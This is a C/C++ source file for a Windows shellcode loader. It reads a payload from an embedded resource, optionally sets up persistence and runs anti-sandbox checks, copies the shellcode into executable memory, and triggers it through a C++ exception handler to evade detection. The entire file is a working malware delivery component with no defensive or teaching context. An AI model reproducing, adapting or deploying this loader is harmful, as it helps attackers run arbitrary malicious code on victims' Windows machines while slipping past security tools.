#include <windows.h>
#include <Dbghelp.h>
#include "../Loader.h"
LPVOID Memory;
LONG ExceptFilter()
{
	((void (*)())Memory)();
	return EXCEPTION_CONTINUE_EXECUTION;
}

void f()
{
	throw 1;
}
int main()
{

	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(SOURCEID, &shellcodeSize);
	if (shellcode == NULL)
	{
		printf("Get Resource error\n");
		return 1;
	}
	if (*shellcode & 1)
	{
		AutoStart();
	}
	if (*shellcode & 2)
	{
		AntiSimulation();
	}
	//2.Get shellcode memory
	Memory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, shellcode, shellcodeSize);
	//3.Execute shellcode

	int j;
	try
	{
		f();
	}
	catch (int i)
	{
		j = i;
		ExceptFilter();
	}

	//int* p = 0x00000000;
	//*p = 13;

	//ExceptFilter();
	return 0;
}